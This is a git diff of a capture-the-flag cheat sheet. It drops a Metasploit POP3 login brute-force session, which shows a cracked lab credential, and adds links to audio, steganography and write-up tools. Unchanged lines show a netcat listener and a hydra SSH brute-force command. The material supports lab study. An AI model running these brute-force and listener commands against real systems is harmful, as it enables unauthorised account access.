@@ -77,18 +77,6 @@ ftp> get file.txt -
 ```sh
 msf6 > use auxiliary/scanner/po
 use auxiliary/scanner/pop3/pop3_login 
-msf6 > use auxiliary/scanner/pop3/pop3_login 
-msf6 auxiliary(scanner/pop3/pop3_login) > set rhosts <Target_Ip>
-rhosts => <Target_IP>
-msf6 auxiliary(scanner/pop3/pop3_login) > set user_file username.txt
-user_file => username.txt
-msf6 auxiliary(scanner/pop3/pop3_login) > set pass_file password.txt
-pass_file => password.txt
-msf6 auxiliary(scanner/pop3/pop3_login) > set verbose false
-verbose => false
-msf6 auxiliary(scanner/pop3/pop3_login) > run
-
-[+] 10.10.226.177:110     - 10.10.226.177:110 - Success: 'seina:scoobydoo2' '+OK Logged in.  '
 ```
 - Need the Listener Now
 
@@ -135,7 +123,10 @@ nc -nlvp <port_number>
 
 - #### **Audio Decoder**
     - [Morsecode](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
-
+    - [For more accurate](https://www.sonicvisualiser.org/download.html)
+    - [dcode](https://www.dcode.fr/spectral-analysis)
+- #### Stegnography
+    - [steghide webapp](https://www.aperisolve.com/)
 - #### **Password Decoder**
     - [Check Psychobreak](https://www.cachesleuth.com/vanity.html)
 
@@ -161,3 +152,6 @@ hydra -l <ssh name> -P <passwordlist> -t 6 ssh://target
 
 ## TIPS
 - **Try To know the Current Versions of SSH,UBUNTU,FTP etc**
+
+## Important WriteUps
+- [stefanBargan](https://stefanbargan.medium.com/)
